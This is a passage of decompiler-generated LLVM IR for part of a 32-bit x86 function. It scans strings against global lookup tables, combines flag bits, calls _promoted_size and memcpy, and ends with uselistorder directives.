  %v4_805d387 = phi i32 [ %v6_805d387, %dec_label_pc_805d391 ], [ %v4_805d387.pre, %dec_label_pc_805d382 ]
  %v2_805d387 = load i8, i8* %.pre, align 1
  %v3_805d387 = zext i8 %v2_805d387 to i32
  %v5_805d387 = and i32 %v4_805d387, -256
  %v6_805d387 = or i32 %v3_805d387, %v5_805d387
  store i32 %v6_805d387, i32* %eax.global-to-local, align 4
  %v3_805d389 = inttoptr i32 %v0_805d391 to i8*
  %v4_805d389 = load i8, i8* %v3_805d389, align 1
  %v15_805d389 = icmp eq i8 %v2_805d387, %v4_805d389
  br i1 %v15_805d389, label %dec_label_pc_805d1f9, label %dec_label_pc_805d391

dec_label_pc_805d391:                             ; preds = %dec_label_pc_805d387
  %v1_805d391 = add i32 %v0_805d391, 1
  store i32 %v1_805d391, i32* @edx, align 4
  %v1_805d392 = inttoptr i32 %v1_805d391 to i8*
  %v2_805d392 = load i8, i8* %v1_805d392, align 1
  %v3_805d392 = icmp eq i8 %v2_805d392, 0
  %v1_805d395 = icmp eq i1 %v3_805d392, false
  br i1 %v1_805d395, label %dec_label_pc_805d387, label %dec_label_pc_805d397

dec_label_pc_805d397:                             ; preds = %dec_label_pc_805d391, %dec_label_pc_805d1f9
  %v0_805d3aa = phi i32 [ %v1_805d1f9, %dec_label_pc_805d1f9 ], [ %v0_805d387.pre.pre, %dec_label_pc_805d391 ]
  %v0_805d3a7 = phi i32 [ %v0_805d391, %dec_label_pc_805d1f9 ], [ %v1_805d391, %dec_label_pc_805d391 ]
  %v1_805d399 = add i32 %v0_805d3a7, -134666508
  %v1_805d39e = add i32 %v0_805d3a7, -134666509
  %v5_805d39e = sub i32 134666508, %v0_805d3a7
  %v6_805d39e = and i32 %v1_805d399, %v5_805d39e
  %v7_805d39e = icmp slt i32 %v6_805d39e, 0
  %v8_805d39e = icmp eq i32 %v1_805d39e, 0
  %v9_805d39e = icmp slt i32 %v1_805d39e, 0
  store i32 %v1_805d39e, i32* %eax.global-to-local, align 4
  %v3_805d39f = icmp eq i1 %v9_805d39e, %v7_805d39e
  %v4_805d39f = icmp eq i1 %v8_805d39e, false
  %v5_805d39f = and i1 %v4_805d39f, %v3_805d39f
  br i1 %v5_805d39f, label %dec_label_pc_805d3ab, label %dec_label_pc_805d3a1

dec_label_pc_805d3a1:                             ; preds = %dec_label_pc_805d397
  %v1_805d3a1 = inttoptr i32 %v0_805d3aa to i8*
  %v2_805d3a1 = load i8, i8* %v1_805d3a1, align 1
  %v3_805d3a1 = zext i8 %v2_805d3a1 to i32
  %v5_805d3a1 = and i32 %v1_805d39e, -256
  %v6_805d3a1 = or i32 %v3_805d3a1, %v5_805d3a1
  store i32 %v6_805d3a1, i32* %eax.global-to-local, align 4
  %v3_805d3a3 = inttoptr i32 %v0_805d3a7 to i8*
  %v4_805d3a3 = load i8, i8* %v3_805d3a3, align 1
  %v15_805d3a3 = icmp eq i8 %v2_805d3a1, %v4_805d3a3
  %v1_805d3a5 = icmp eq i1 %v15_805d3a3, false
  br i1 %v1_805d3a5, label %dec_label_pc_805d3ab, label %dec_label_pc_805d3a7

dec_label_pc_805d3a7:                             ; preds = %dec_label_pc_805d3a1
  %v1_805d3a7 = add i32 %v0_805d3a7, 9
  store i32 %v1_805d3a7, i32* @edx, align 4
  %v1_805d3aa = add i32 %v0_805d3aa, 1
  store i32 %v1_805d3aa, i32* @esi, align 4
  br label %dec_label_pc_805d3ab

dec_label_pc_805d3ab:                             ; preds = %dec_label_pc_805d3a1, %dec_label_pc_805d397, %dec_label_pc_805d3a7
  %v4_805d3af = phi i32 [ %v6_805d3a1, %dec_label_pc_805d3a1 ], [ %v1_805d39e, %dec_label_pc_805d397 ], [ %v6_805d3a1, %dec_label_pc_805d3a7 ]
  %v0_805d3af = phi i32 [ %v0_805d3aa, %dec_label_pc_805d3a1 ], [ %v0_805d3aa, %dec_label_pc_805d397 ], [ %v1_805d3aa, %dec_label_pc_805d3a7 ]
  %v0_805d3ab = phi i32 [ %v0_805d3a7, %dec_label_pc_805d3a1 ], [ %v0_805d3a7, %dec_label_pc_805d397 ], [ %v1_805d3a7, %dec_label_pc_805d3a7 ]
  %v1_805d3ab = add i32 %v0_805d3ab, 9
  %v2_805d3ab = inttoptr i32 %v1_805d3ab to i8*
  %v3_805d3ab = load i8, i8* %v2_805d3ab, align 1
  %v4_805d3ab = sext i8 %v3_805d3ab to i32
  store i32 %v4_805d3ab, i32* %ebx.global-to-local, align 4
  %v1_805d3af = inttoptr i32 %v0_805d3af to i8*
  %v2_805d3af = load i8, i8* %v1_805d3af, align 1
  %v3_805d3af = zext i8 %v2_805d3af to i32
  %v5_805d3af = and i32 %v4_805d3af, -256
  %v6_805d3af = or i32 %v3_805d3af, %v5_805d3af
  store i32 %v6_805d3af, i32* %eax.global-to-local, align 4
  %v2_805d3b1 = mul nsw i32 %v4_805d3ab, 256
  store i32 %v2_805d3b1, i32* %ebx.global-to-local, align 4
  %v4_805d3b4 = icmp eq i8 %v2_805d3af, 0
  br i1 %v4_805d3b4, label %dec_label_pc_805d571, label %dec_label_pc_805d3bc

dec_label_pc_805d3bc:                             ; preds = %dec_label_pc_805d3ab
  %v3_805d3bc = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_805d3bc, i32* %edx.global-to-local, align 4
  store i32 ptrtoint ([21 x i8]* @global_var_806d949.657 to i32), i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_805d3c5

dec_label_pc_805d3c5:                             ; preds = %dec_label_pc_805d415, %dec_label_pc_805d3bc
  %v0_805d415 = phi i32 [ %v1_805d415, %dec_label_pc_805d415 ], [ ptrtoint ([21 x i8]* @global_var_806d949.657 to i32), %dec_label_pc_805d3bc ]
  %v3_805d3c5 = inttoptr i32 %v0_805d415 to i8*
  %v4_805d3c5 = load i8, i8* %v3_805d3c5, align 1
  %v15_805d3c5 = icmp eq i8 %v2_805d3af, %v4_805d3c5
  %v1_805d3c7 = icmp eq i1 %v15_805d3c5, false
  br i1 %v1_805d3c7, label %dec_label_pc_805d415, label %dec_label_pc_805d3c9

dec_label_pc_805d3c9:                             ; preds = %dec_label_pc_805d3c5
  %v1_805d3cb = add i32 %v0_805d415, -134666569
  store i32 %v1_805d3cb, i32* %edx.global-to-local, align 4
  %v7_805d3d4 = icmp sgt i32 %v1_805d3cb, 17
  br i1 %v7_805d3d4, label %dec_label_pc_805d3d6, label %dec_label_pc_805d3df

dec_label_pc_805d3d6:                             ; preds = %dec_label_pc_805d3c9
  %v1_805d3d6 = add i32 %v0_805d415, -134666571
  store i32 %v1_805d3d6, i32* %eax.global-to-local, align 4
  %v3_805d3d9 = and i32 %v2_805d3b1, 1024
  %v4_805d3d9 = icmp eq i32 %v3_805d3d9, 0
  %v1_805d3dc = icmp eq i1 %v4_805d3d9, false
  %v4_805d3dc = select i1 %v1_805d3dc, i32 %v1_805d3d6, i32 %v1_805d3cb
  store i32 %v4_805d3dc, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805d3df

dec_label_pc_805d3df:                             ; preds = %dec_label_pc_805d3c9, %dec_label_pc_805d3d6
  %v0_805d3e8 = phi i32 [ %v1_805d3cb, %dec_label_pc_805d3c9 ], [ %v4_805d3dc, %dec_label_pc_805d3d6 ]
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_806d93f.658 to i32), i32* %ecx.global-to-local, align 4
  %v2_805d3e8 = add i32 %tmp76, 32
  %v3_805d3e8 = inttoptr i32 %v2_805d3e8 to i32*
  store i32 %v0_805d3e8, i32* %v3_805d3e8, align 4
  %v0_805d3eb.pre = load i32, i32* %ecx.global-to-local, align 4
  %v0_805d3ef.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805d3eb

dec_label_pc_805d3eb:                             ; preds = %dec_label_pc_805d3eb, %dec_label_pc_805d3df
  %v0_805d3eb = phi i32 [ %v1_805d3eb, %dec_label_pc_805d3eb ], [ %v0_805d3eb.pre, %dec_label_pc_805d3df ]
  %v1_805d3eb = add i32 %v0_805d3eb, 1
  store i32 %v1_805d3eb, i32* %ecx.global-to-local, align 4
  %v1_805d3ec = inttoptr i32 %v1_805d3eb to i8*
  %v2_805d3ec = load i8, i8* %v1_805d3ec, align 1
  %v3_805d3ec = sext i8 %v2_805d3ec to i32
  store i32 %v3_805d3ec, i32* %eax.global-to-local, align 4
  %v8_805d3f1 = icmp sgt i32 %v0_805d3ef.pre, %v3_805d3ec
  br i1 %v8_805d3f1, label %dec_label_pc_805d3eb, label %dec_label_pc_805d3f3

dec_label_pc_805d3f3:                             ; preds = %dec_label_pc_805d3eb
  store i32 ptrtoint ([21 x i8]* @global_var_806d949.657 to i32), i32* @ecx, align 4
  %v1_805d3fa = add i32 %v0_805d3eb, -134666559
  store i32 %v1_805d3fa, i32* %eax.global-to-local, align 4
  %v2_805d3ff = add i32 %v0_805d3eb, add (i32 ptrtoint (i32* @global_var_806d930.659 to i32), i32 -134666559)
  %v3_805d3ff = add i32 %v2_805d3ff, %v1_805d3fa
  %v4_805d3ff = inttoptr i32 %v3_805d3ff to i16*
  %v5_805d3ff = load i16, i16* %v4_805d3ff, align 2
  %v6_805d3ff = sext i16 %v5_805d3ff to i32
  store i32 %v6_805d3ff, i32* %edx.global-to-local, align 4
  %factor = mul i32 %v1_805d3fa, 2
  %v3_805d407 = add i32 %factor, 134666528
  %v4_805d407 = inttoptr i32 %v3_805d407 to i16*
  %v5_805d407 = load i16, i16* %v4_805d407, align 2
  %v6_805d407 = sext i16 %v5_805d407 to i32
  store i32 %v6_805d407, i32* %eax.global-to-local, align 4
  %v1_805d40f = load i32, i32* %ebx.global-to-local, align 4
  %v2_805d40f = or i32 %v1_805d40f, %v6_805d3ff
  %v2_805d411 = and i32 %v2_805d40f, %v6_805d407
  store i32 %v2_805d411, i32* %edx.global-to-local, align 4
  %v0_805d423.pre = load i32, i32* @esi, align 4
  %v0_805d426.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_805d41b

dec_label_pc_805d415:                             ; preds = %dec_label_pc_805d3c5
  %v1_805d415 = add i32 %v0_805d415, 1
  store i32 %v1_805d415, i32* @ecx, align 4
  %v1_805d416 = inttoptr i32 %v1_805d415 to i8*
  %v2_805d416 = load i8, i8* %v1_805d416, align 1
  %v3_805d416 = icmp eq i8 %v2_805d416, 0
  %v1_805d419 = icmp eq i1 %v3_805d416, false
  br i1 %v1_805d419, label %dec_label_pc_805d3c5, label %dec_label_pc_805d41b

dec_label_pc_805d41b:                             ; preds = %dec_label_pc_805d415, %dec_label_pc_805d3f3
  %v0_805d426 = phi i32 [ %v0_805d426.pre, %dec_label_pc_805d3f3 ], [ %storemerge4, %dec_label_pc_805d415 ]
  %v0_805d423 = phi i32 [ %v0_805d423.pre, %dec_label_pc_805d3f3 ], [ %v0_805d3af, %dec_label_pc_805d415 ]
  %v0_805d41b = phi i32 [ %v2_805d411, %dec_label_pc_805d3f3 ], [ %v3_805d3bc, %dec_label_pc_805d415 ]
  store i32 %v0_805d41b, i32* %stack_var_-20, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v1_805d423 = inttoptr i32 %v0_805d423 to i8*
  %v2_805d423 = load i8, i8* %v1_805d423, align 1
  %v3_805d423 = sext i8 %v2_805d423 to i32
  store i32 %v3_805d423, i32* %eax.global-to-local, align 4
  %v2_805d426 = add i32 %tmp76, 4
  %v3_805d426 = inttoptr i32 %v2_805d426 to i32*
  store i32 %v0_805d426, i32* %v3_805d426, align 4
  %v0_805d429 = load i32, i32* %eax.global-to-local, align 4
  %v1_805d429 = load i32, i32* @edx, align 4
  %v2_805d429 = add i32 %v1_805d429, 12
  %v3_805d429 = inttoptr i32 %v2_805d429 to i32*
  store i32 %v0_805d429, i32* %v3_805d429, align 4
  store i32 %stack_var_-96.2, i32* %eax.global-to-local, align 4
  %v0_805d430 = load i32, i32* @edx, align 4
  %v1_805d430 = add i32 %v0_805d430, 28
  %v2_805d430 = inttoptr i32 %v1_805d430 to i32*
  store i32 1, i32* %v2_805d430, align 4
  %v0_805d437 = load i32, i32* %eax.global-to-local, align 4
  %v1_805d437 = load i32, i32* @edx, align 4
  %v2_805d437 = add i32 %v1_805d437, 8
  %v3_805d437 = inttoptr i32 %v2_805d437 to i32*
  store i32 %v0_805d437, i32* %v3_805d437, align 4
  %v0_805d43a = load i32, i32* %edi.global-to-local, align 4
  %v1_805d444 = and i32 %v0_805d43a, -5
  %v0_805d44a = load i32, i32* %ebx.global-to-local, align 4
  %v1_805d44a = and i32 %v0_805d44a, 3840
  store i32 %v1_805d44a, i32* %ebx.global-to-local, align 4
  store i32 48, i32* %eax.global-to-local, align 4
  %v2_805d453 = or i32 %v1_805d44a, %v1_805d444
  store i32 %v2_805d453, i32* @edi, align 4
  %v1_805d455 = load i32, i32* @edx, align 4
  %v2_805d455 = add i32 %v1_805d455, 20
  %v3_805d455 = inttoptr i32 %v2_805d455 to i32*
  store i32 48, i32* %v3_805d455, align 4
  %v0_805d458 = load i32, i32* @edi, align 4
  %v1_805d458 = load i32, i32* @edx, align 4
  %v2_805d458 = add i32 %v1_805d458, 16
  %v3_805d458 = inttoptr i32 %v2_805d458 to i32*
  store i32 %v0_805d458, i32* %v3_805d458, align 4
  %v0_805d45b = load i32, i32* @ecx, align 4
  %v1_805d45b = inttoptr i32 %v0_805d45b to i8*
  %v2_805d45b = load i8, i8* %v1_805d45b, align 1
  %v3_805d45b = icmp eq i8 %v2_805d45b, 0
  %v1_805d45e = icmp eq i1 %v3_805d45b, false
  br i1 %v1_805d45e, label %dec_label_pc_805d477, label %dec_label_pc_805d460

dec_label_pc_805d460:                             ; preds = %dec_label_pc_805d41b
  %v0_805d460 = load i32, i32* @esi, align 4
  %v1_805d460 = inttoptr i32 %v0_805d460 to i8*
  %v2_805d460 = load i8, i8* %v1_805d460, align 1
  %v11_805d460 = icmp eq i8 %v2_805d460, 109
  %v1_805d463 = icmp eq i1 %v11_805d460, false
  br i1 %v1_805d463, label %dec_label_pc_805d571, label %dec_label_pc_805d469

dec_label_pc_805d469:                             ; preds = %dec_label_pc_805d460
  %v0_805d469 = load i32, i32* @edx, align 4
  %v1_805d469 = add i32 %v0_805d469, 32
  %v2_805d469 = inttoptr i32 %v1_805d469 to i32*
  store i32 20, i32* %v2_805d469, align 4
  %v0_805d470 = load i32, i32* @edx, align 4
  %v1_805d470 = add i32 %v0_805d470, 28
  %v2_805d470 = inttoptr i32 %v1_805d470 to i32*
  store i32 0, i32* %v2_805d470, align 4
  br label %dec_label_pc_805d477

dec_label_pc_805d477:                             ; preds = %dec_label_pc_805d41b, %dec_label_pc_805d469
  %tmp92 = icmp slt i32 %stack_var_-88.3, 1
  br i1 %tmp92, label %dec_label_pc_805d513, label %dec_label_pc_805d482

dec_label_pc_805d482:                             ; preds = %dec_label_pc_805d477
  store i32 0, i32* %ebp.global-to-local, align 4
  %v4_805d4fb = add i32 %tmp76, 40
  %v4_805d491 = add i32 %tmp76, 36
  %v1_805d504 = add i32 %tmp76, 28
  %v2_805d504 = inttoptr i32 %v1_805d504 to i32*
  br label %dec_label_pc_805d484

dec_label_pc_805d484:                             ; preds = %dec_label_pc_805d4ff, %dec_label_pc_805d482
  %v0_805d49a = phi i32 [ 0, %dec_label_pc_805d482 ], [ %v1_805d503, %dec_label_pc_805d4ff ]
  %stack_var_-88.4 = phi i32 [ %stack_var_-88.3, %dec_label_pc_805d482 ], [ %stack_var_-88.5, %dec_label_pc_805d4ff ]
  %v1_805d484 = add i32 %v0_805d49a, -2
  %v6_805d484 = sub i32 1, %v0_805d49a
  %v7_805d484 = and i32 %v6_805d484, %v0_805d49a
  %v8_805d484 = icmp slt i32 %v7_805d484, 0
  %v9_805d484 = icmp eq i32 %v1_805d484, 0
  %v10_805d484 = icmp slt i32 %v1_805d484, 0
  %v3_805d487 = icmp eq i1 %v10_805d484, %v8_805d484
  %v4_805d487 = icmp eq i1 %v9_805d484, false
  %v5_805d487 = and i1 %v4_805d487, %v3_805d487
  br i1 %v5_805d487, label %dec_label_pc_805d49a, label %dec_label_pc_805d489

dec_label_pc_805d489:                             ; preds = %dec_label_pc_805d484
  %v0_805d489 = load i32, i32* @esp, align 4
  %v2_805d489 = mul i32 %v0_805d49a, 4
  %v3_805d489 = add i32 %v2_805d489, 68
  %v4_805d489 = add i32 %v3_805d489, %v0_805d489
  %v5_805d489 = inttoptr i32 %v4_805d489 to i32*
  %v6_805d489 = load i32, i32* %v5_805d489, align 4
  store i32 %v6_805d489, i32* %eax.global-to-local, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v1_805d491 = trunc i32 %v6_805d489 to i8
  %v5_805d491 = add i32 %v4_805d491, %v0_805d49a
  %v6_805d491 = inttoptr i32 %v5_805d491 to i8*
  store i8 %v1_805d491, i8* %v6_805d491, align 1
  %v0_805d495 = load i32, i32* %eax.global-to-local, align 4
  %v1_805d495 = urem i32 %v0_805d495, 256
  br label %dec_label_pc_805d4a3

dec_label_pc_805d49a:                             ; preds = %dec_label_pc_805d484
  %v5_805d49c = add i32 %v0_805d49a, %stack_var_-32.3
  store i32 %v5_805d49c, i32* %eax.global-to-local, align 4
  %v1_805d4a0 = add i32 %v5_805d49c, -2
  br label %dec_label_pc_805d4a3

dec_label_pc_805d4a3:                             ; preds = %dec_label_pc_805d489, %dec_label_pc_805d49a
  %v0_805d4b6 = phi i32 [ %v1_805d495, %dec_label_pc_805d489 ], [ %v1_805d4a0, %dec_label_pc_805d49a ]
  store i32 %v0_805d4b6, i32* %eax.global-to-local, align 4
  %v5_805d4a3 = sub i32 %v0_805d4b6, %stack_var_-88.4
  %v11_805d4a3 = xor i32 %v0_805d4b6, %stack_var_-88.4
  %v12_805d4a3 = xor i32 %v5_805d4a3, %v0_805d4b6
  %v13_805d4a3 = and i32 %v12_805d4a3, %v11_805d4a3
  %v14_805d4a3 = icmp slt i32 %v13_805d4a3, 0
  %v15_805d4a3 = icmp eq i32 %v5_805d4a3, 0
  %v16_805d4a3 = icmp slt i32 %v5_805d4a3, 0
  %v3_805d4a7 = icmp ne i1 %v16_805d4a3, %v14_805d4a3
  %v4_805d4a7 = or i1 %v15_805d4a3, %v3_805d4a7
  br i1 %v4_805d4a7, label %dec_label_pc_805d4b6, label %dec_label_pc_805d4a9

dec_label_pc_805d4a9:                             ; preds = %dec_label_pc_805d4a3
  %v1_805d4a9 = add i32 %v0_805d4b6, -9
  %v6_805d4a9 = sub i32 8, %v0_805d4b6
  %v7_805d4a9 = and i32 %v6_805d4a9, %v0_805d4b6
  %v8_805d4a9 = icmp slt i32 %v7_805d4a9, 0
  %v9_805d4a9 = icmp eq i32 %v1_805d4a9, 0
  %v10_805d4a9 = icmp slt i32 %v1_805d4a9, 0
  %v3_805d4ac = icmp eq i1 %v10_805d4a9, %v8_805d4a9
  %v4_805d4ac = icmp eq i1 %v9_805d4a9, false
  %v5_805d4ac = and i1 %v4_805d4ac, %v3_805d4ac
  br i1 %v5_805d4ac, label %dec_label_pc_805d571, label %dec_label_pc_805d4b6

dec_label_pc_805d4b6:                             ; preds = %dec_label_pc_805d4a9, %dec_label_pc_805d4a3
  %stack_var_-88.5 = phi i32 [ %stack_var_-88.4, %dec_label_pc_805d4a3 ], [ %v0_805d4b6, %dec_label_pc_805d4a9 ]
  %v1_805d4b6 = add i32 %v0_805d4b6, -1
  store i32 %v1_805d4b6, i32* %eax.global-to-local, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v0_805d4bf = load i32, i32* @esp, align 4
  %v1_805d4bf = load i32, i32* %ebp.global-to-local, align 4
  %v2_805d4bf = mul i32 %v1_805d4bf, 4
  %v3_805d4bf = add i32 %v0_805d4bf, 80
  %v4_805d4bf = add i32 %v3_805d4bf, %v2_805d4bf
  %v5_805d4bf = inttoptr i32 %v4_805d4bf to i32*
  %v6_805d4bf = load i32, i32* %v5_805d4bf, align 4
  store i32 %v6_805d4bf, i32* %edi.global-to-local, align 4
  %v2_805d4c3 = mul i32 %v1_805d4b6, 4
  %v4_805d4c3 = add i32 %v4_805d4fb, %v2_805d4c3
  %v5_805d4c3 = inttoptr i32 %v4_805d4c3 to i32*
  %v6_805d4c3 = load i32, i32* %v5_805d4c3, align 4
  store i32 %v6_805d4c3, i32* @eax, align 4
  %v9_805d4c7 = icmp eq i32 %v6_805d4bf, 8
  br i1 %v9_805d4c7, label %dec_label_pc_805d4ff, label %dec_label_pc_805d4cc

dec_label_pc_805d4cc:                             ; preds = %dec_label_pc_805d4b6
  %v9_805d4cc = icmp eq i32 %v6_805d4c3, 8
  br i1 %v9_805d4cc, label %dec_label_pc_805d4ef, label %dec_label_pc_805d4d1

dec_label_pc_805d4d1:                             ; preds = %dec_label_pc_805d4cc
  %v12_805d4d1 = icmp eq i32 %v6_805d4c3, %v6_805d4bf
  br i1 %v12_805d4d1, label %dec_label_pc_805d4ef, label %dec_label_pc_805d4d5

dec_label_pc_805d4d5:                             ; preds = %dec_label_pc_805d4d1
  %v1_805d4d5 = call i32 @_promoted_size(i32 %v1_805d4b6)
  store i32 %v1_805d4d5, i32* %ebx.global-to-local, align 4
  %v0_805d4dc = load i32, i32* %edi.global-to-local, align 4
  store i32 %v0_805d4dc, i32* @eax, align 4
  %v1_805d4de = call i32 @_promoted_size(i32 %v1_805d4b6)
  %v2_805d4e3 = sub i32 %v1_805d4d5, %v1_805d4de
  %v8_805d4e3 = xor i32 %v1_805d4d5, %v1_805d4de
  %v9_805d4e3 = xor i32 %v2_805d4e3, %v1_805d4d5
  %v10_805d4e3 = and i32 %v9_805d4e3, %v8_805d4e3
  %v11_805d4e3 = icmp slt i32 %v10_805d4e3, 0
  %v12_805d4e3 = icmp eq i32 %v2_805d4e3, 0
  %v13_805d4e3 = icmp slt i32 %v2_805d4e3, 0
  %v3_805d4e5 = icmp ne i1 %v13_805d4e3, %v11_805d4e3
  %v4_805d4e5 = or i1 %v12_805d4e3, %v3_805d4e5
  %v5_805d4e5 = zext i1 %v4_805d4e5 to i32
  store i32 %v5_805d4e5, i32* %eax.global-to-local, align 4
  %v1_805d4eb = icmp eq i1 %v4_805d4e5, false
  br i1 %v1_805d4eb, label %dec_label_pc_805d4ff, label %dec_label_pc_805d4d5.dec_label_pc_805d4ef_crit_edge

dec_label_pc_805d4d5.dec_label_pc_805d4ef_crit_edge: ; preds = %dec_label_pc_805d4d5
  %v0_805d4ef.pre = load i32, i32* @esp, align 4
  %v1_805d4ef.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_805d4ef

dec_label_pc_805d4ef:                             ; preds = %dec_label_pc_805d4d5.dec_label_pc_805d4ef_crit_edge, %dec_label_pc_805d4d1, %dec_label_pc_805d4cc
  %v1_805d4ef = phi i32 [ %v1_805d4ef.pre, %dec_label_pc_805d4d5.dec_label_pc_805d4ef_crit_edge ], [ %v1_805d4bf, %dec_label_pc_805d4d1 ], [ %v1_805d4bf, %dec_label_pc_805d4cc ]
  %v0_805d4ef = phi i32 [ %v0_805d4ef.pre, %dec_label_pc_805d4d5.dec_label_pc_805d4ef_crit_edge ], [ %v0_805d4bf, %dec_label_pc_805d4d1 ], [ %v0_805d4bf, %dec_label_pc_805d4cc ]
  %v2_805d4ef = mul i32 %v1_805d4ef, 4
  %v3_805d4ef = add i32 %v0_805d4ef, 80
  %v4_805d4ef = add i32 %v3_805d4ef, %v2_805d4ef
  %v5_805d4ef = inttoptr i32 %v4_805d4ef to i32*
  %v6_805d4ef = load i32, i32* %v5_805d4ef, align 4
  store i32 %v6_805d4ef, i32* %eax.global-to-local, align 4
  store i32 %v1_805d4b6, i32* %ecx.global-to-local, align 4
  store i32 %tmp76, i32* @edx, align 4
  store i32 %v6_805d4ef, i32* %v5_805d4c3, align 4
  br label %dec_label_pc_805d4ff

dec_label_pc_805d4ff:                             ; preds = %dec_label_pc_805d4d5, %dec_label_pc_805d4b6, %dec_label_pc_805d4ef
  store i32 %tmp76, i32* @ecx, align 4
  %v0_805d503 = load i32, i32* %ebp.global-to-local, align 4
  %v1_805d503 = add i32 %v0_805d503, 1
  store i32 %v1_805d503, i32* %ebp.global-to-local, align 4
  %v3_805d504 = load i32, i32* %v2_805d504, align 4
  %v1_805d507 = add i32 %v3_805d504, 2
  store i32 %v1_805d507, i32* %eax.global-to-local, align 4
  %v5_805d50c = icmp slt i32 %v1_805d503, %v1_805d507
  br i1 %v5_805d50c, label %dec_label_pc_805d484, label %dec_label_pc_805d53a

dec_label_pc_805d513:                             ; preds = %dec_label_pc_805d477
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  %v1_805d517 = add i32 %tmp76, 38
  %v2_805d517 = inttoptr i32 %v1_805d517 to i8*
  store i8 1, i8* %v2_805d517, align 1
  store i32 %tmp76, i32* %edx.global-to-local, align 4
  %v1_805d520 = add i32 %tmp76, 28
  %v2_805d520 = inttoptr i32 %v1_805d520 to i32*
  %v3_805d520 = load i32, i32* %v2_805d520, align 4
  %v2_805d523 = mul i32 %v3_805d520, 4
  %v2_805d527 = ptrtoint i32* %stack_var_-20 to i32
  %v1_805d52e = add i32 %tmp76, 40
  store i32 %v1_805d52e, i32* %eax.global-to-local, align 4
  %v3_805d532 = inttoptr i32 %v1_805d52e to i16*
  %v4_805d532 = call i32 @memcpy(i16* %v3_805d532, i32 %v2_805d527, i32 %v2_805d523)
  store i32 %v4_805d532, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805d53a

dec_label_pc_805d53a:                             ; preds = %dec_label_pc_805d4ff, %dec_label_pc_805d513
  %stack_var_-88.6 = phi i32 [ %stack_var_-88.3, %dec_label_pc_805d513 ], [ %stack_var_-88.5, %dec_label_pc_805d4ff ]
  store i32 %tmp76, i32* @ecx, align 4
  store i32 %stack_var_-88.6, i32* %eax.global-to-local, align 4
  %v2_805d542 = inttoptr i32 %v1_805d1e3 to i8*
  %v3_805d542 = load i8, i8* %v2_805d542, align 1
  %v5_805d542 = icmp slt i8 %v3_805d542, 0
  store i32 %stack_var_-88.6, i32* %v2_805d1dc, align 4
  br i1 %v5_805d542, label %dec_label_pc_805d552, label %dec_label_pc_805d54b

dec_label_pc_805d54b:                             ; preds = %dec_label_pc_805d53a
  %v0_805d54b = load i32, i32* @esi, align 4
  %v1_805d54b = add i32 %v0_805d54b, 1
  store i32 %v1_805d54b, i32* %eax.global-to-local, align 4
  %v1_805d54e = load i32, i32* @ecx, align 4
  %v2_805d54e = inttoptr i32 %v1_805d54e to i32*
  store i32 %v1_805d54b, i32* %v2_805d54e, align 4
  br label %dec_label_pc_805d565

dec_label_pc_805d552:                             ; preds = %dec_label_pc_805d53a
  store i32 %tmp76, i32* @ecx, align 4
  store i32 %v4_805d1b0, i32* %edx.global-to-local, align 4
  %v0_805d55a = load i32, i32* @esi, align 4
  %v2_805d55a = sub i32 %v0_805d55a, %v4_805d1b0
  store i32 %v2_805d55a, i32* %esi.global-to-local, align 4
  %v1_805d55c = mul i32 %v2_805d55a, 4
  %v2_805d55c = add i32 %v1_805d55c, 224
  store i32 %v2_805d55c, i32* %eax.global-to-local, align 4
  %v2_805d563 = load i32, i32* %arg1, align 4
  %v4_805d563 = add i32 %v2_805d563, %v2_805d55c
  store i32 %v4_805d563, i32* %arg1, align 4
  br label %dec_label_pc_805d565

dec_label_pc_805d565:                             ; preds = %dec_label_pc_805d54b, %dec_label_pc_805d552
  store i32 %tmp76, i32* @edx, align 4
  %v1_805d569 = add i32 %tmp76, 28
  %v2_805d569 = inttoptr i32 %v1_805d569 to i32*
  %v3_805d569 = load i32, i32* %v2_805d569, align 4
  store i32 %v3_805d569, i32* %eax.global-to-local, align 4
  %v1_805d56c = add i32 %v3_805d569, 2
  br label %dec_label_pc_805d574

dec_label_pc_805d571:                             ; preds = %dec_label_pc_805d201, %dec_label_pc_805d29b, %dec_label_pc_805d2ce, %dec_label_pc_805d349, %dec_label_pc_805d335, %dec_label_pc_805d32c, %dec_label_pc_805d4a9, %dec_label_pc_805d460, %dec_label_pc_805d3ab
  br label %dec_label_pc_805d574

dec_label_pc_805d574:                             ; preds = %dec_label_pc_805d565, %dec_label_pc_805d571
  %storemerge6 = phi i32 [ %v1_805d56c, %dec_label_pc_805d565 ], [ -1, %dec_label_pc_805d571 ]
  store i32 %storemerge6, i32* %eax.global-to-local, align 4
  %v2_805d577 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_805d577, i32* @ebx, align 4
  store i32 %v0_805d1af, i32* @esi, align 4
  store i32 %v0_805d1ae, i32* @edi, align 4
  ret i32 %storemerge6

; uselistorder directives
  uselistorder i32 %v1_805d503, { 0, 2, 1 }
  uselistorder i32 %v2_805d4e3, { 1, 2, 0 }
  uselistorder i32 %v1_805d4d5, { 2, 1, 0, 3 }
  uselistorder i32 %v1_805d4b6, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v1_805d4a9, { 1, 0 }
  uselistorder i32 %v5_805d4a3, { 1, 2, 0 }
  uselistorder i32 %v0_805d4b6, { 4, 3, 0, 6, 5, 1, 2, 7, 8 }
  uselistorder i32 %v1_805d484, { 1, 0 }
  uselistorder i32 %stack_var_-88.4, { 1, 0, 2 }
  uselistorder i32 %v0_805d49a, { 0, 2, 3, 1, 5, 4 }
  uselistorder i32 %v1_805d415, { 1, 2, 0 }
  uselistorder i32 %v1_805d3eb, { 1, 2, 0 }
  uselistorder i32 %v0_805d415, { 2, 0, 1, 3 }
  uselistorder i32 %v2_805d3b1, { 1, 0 }
  uselistorder i32 %v1_805d39e, { 0, 1, 4, 3, 2 }
  uselistorder i32 %v0_805d3a7, { 0, 1, 2, 3, 6, 5, 4 }
  uselistorder i32 %v1_805d391, { 0, 2, 3, 1 }
  uselistorder i32 %v6_805d387, { 1, 0 }
